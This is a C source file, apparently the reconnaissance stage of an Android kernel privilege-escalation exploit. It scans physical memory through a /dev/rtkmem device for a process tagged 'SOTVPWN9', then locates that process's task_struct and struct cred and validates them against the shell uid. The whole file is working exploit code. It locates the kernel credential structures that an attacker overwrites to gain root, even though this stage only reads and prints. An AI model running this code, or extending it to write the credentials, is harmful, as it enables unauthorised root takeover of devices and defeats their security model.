/* rtfind.c - READ-ONLY locator for the current process's task_struct/cred.
 *
 * Strategy:
 *  1. prctl(PR_SET_NAME) marks this process with a unique comm string.
 *  2. Scan physical RAM (via /dev/rtkmem mmap, PROT_READ) for that comm.
 *  3. Around each comm hit, look for the adjacent equal real_cred/cred
 *     pointer pair that task_struct contains.
 *  4. Validate the pointed-to struct looks like struct cred: 8 consecutive
 *     u32 == our uid (2000 = shell), preceded by a small usage counter.
 *
 * Prints all findings. WRITES ABSOLUTELY NOTHING.
 *
 * Build: clang --target=armv7a-linux-androideabi19 --static -O2 -o rtfind rtfind.c
 * PT_TLS p_align must be patched to 64.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/prctl.h>

#define PAGE_OFFSET 0xC0000000UL
#define SCAN_START  0x00000000UL
#define SCAN_END    0x20000000UL   /* 512 MiB lowmem */
#define CHUNK       (1u << 20)
#define COMM        "SOTVPWN9"     /* 8 chars + NUL, unique */

static sigjmp_buf g_jmp;
static void fault_handler(int sig) { (void)sig; siglongjmp(g_jmp, 1); }

static int fd;
static unsigned char *scratch;

/* Safely read one page of physical memory into scratch (read-only). */
static int read_page(uint64_t phys, size_t len) {
    uint64_t aligned = phys & ~(uint64_t)0xfff;
    size_t off = (size_t)(phys - aligned);
    size_t maplen = ((off + len + 0xfff) & ~(size_t)0xfff);
    void *m = mmap(NULL, maplen, PROT_READ, MAP_SHARED, fd, (off_t)aligned);
    if (m == MAP_FAILED) return 0;
    int ok = 1;
    if (sigsetjmp(g_jmp, 1)) ok = 0;
    if (ok) memcpy(scratch, (char *)m + off, len);
    munmap(m, maplen);
    return ok;
}

int main(void) {
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = fault_handler;
    sigemptyset(&sa.sa_mask);
    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGBUS, &sa, NULL);

    uid_t uid = getuid(), euid = geteuid();
    pid_t pid = getpid();
    printf("[*] rtfind READ-ONLY: pid=%d uid=%u euid=%u\n", pid, uid, euid);
    if (prctl(PR_SET_NAME, (unsigned long)COMM, 0, 0, 0) != 0)
        printf("[!] prctl PR_SET_NAME failed (%s), comm may not match\n", strerror(errno));
    fflush(stdout);

    fd = open("/dev/rtkmem", O_RDONLY);
    if (fd < 0) { printf("open: %s\n", strerror(errno)); return 2; }
    scratch = malloc(CHUNK + 0x2000);
    if (!scratch) return 2;

    size_t commlen = strlen(COMM) + 1;
    int comm_hits = 0;
    printf("[*] scanning phys 0x%lx..0x%lx for comm '%s'\n",
           (unsigned long)SCAN_START, (unsigned long)SCAN_END, COMM);
    fflush(stdout);

    for (uint64_t p = SCAN_START; p < SCAN_END; p += CHUNK) {
        void *m = mmap(NULL, CHUNK + 0x1000, PROT_READ, MAP_SHARED, fd, (off_t)p);
        if (m == MAP_FAILED) continue;
        unsigned char *view = (unsigned char *)m;
        /* Guard the whole scan of this chunk. */
        if (sigsetjmp(g_jmp, 1)) { munmap(m, CHUNK + 0x1000); continue; }
        for (size_t i = 0; i + commlen <= CHUNK; i++) {
            if (memcmp(view + i, COMM, commlen) != 0) continue;
            uint64_t comm_phys = p + i;
            uint32_t comm_virt = (uint32_t)(comm_phys + PAGE_OFFSET);
            comm_hits++;
            printf("\n[+] COMM HIT #%d phys=0x%llx virt=0x%08x\n",
                   comm_hits, (unsigned long long)comm_phys, comm_virt);
            /* task_struct: real_cred/cred are an adjacent equal pointer pair,
             * typically a few hundred bytes before comm. Search +-0x600. */
            int64_t lo = (int64_t)i - 0x600;
            if (lo < 0) lo = 0;
            for (int64_t k = lo; k < (int64_t)i + 0x100; k += 4) {
                uint32_t a, b;
                memcpy(&a, view + k, 4);
                memcpy(&b, view + k + 4, 4);
                if (a != b) continue;
                if (!(0xC0000000UL <= a && a <= 0xD0000000UL)) continue;
                uint64_t cred_phys = (uint64_t)(a - PAGE_OFFSET);
                if (cred_phys >= SCAN_END) continue;
                /* read the candidate cred's first 48 bytes */
                if (!read_page(cred_phys, 48)) continue;
                uint32_t w[12];
                memcpy(w, scratch, 48);
                int nmatch = 0;
                for (int q = 1; q <= 8; q++) if (w[q] == (uint32_t)uid) nmatch++;
                if (nmatch < 6) continue;
                printf("    real_cred/cred pair @phys 0x%llx (virt 0x%08x) -> 0x%08x\n",
                       (unsigned long long)(p + k), (uint32_t)(p + k + PAGE_OFFSET), a);
                printf("    CRED phys=0x%llx  usage=%u  uid-field-matches=%d/8\n",
                       (unsigned long long)cred_phys, w[0], nmatch);
                printf("    cred words: %08x %08x %08x %08x %08x %08x %08x %08x %08x\n",
                       w[0], w[1], w[2], w[3], w[4], w[5], w[6], w[7], w[8]);
                printf("    => task_struct comm offset from pair: 0x%llx\n",
                       (unsigned long long)((int64_t)i - k));
            }
            fflush(stdout);
            if (comm_hits >= 6) break;
        }
        munmap(m, CHUNK + 0x1000);
        if (comm_hits >= 6) break;
        if (((p >> 20) & 0x7f) == 0) {
            printf("    ... scanned %llu MiB\n", (unsigned long long)(p >> 20));
            fflush(stdout);
        }
    }
    printf("\n[*] total comm hits: %d (nothing written)\n", comm_hits);
    free(scratch);
    close(fd);
    return 0;
}
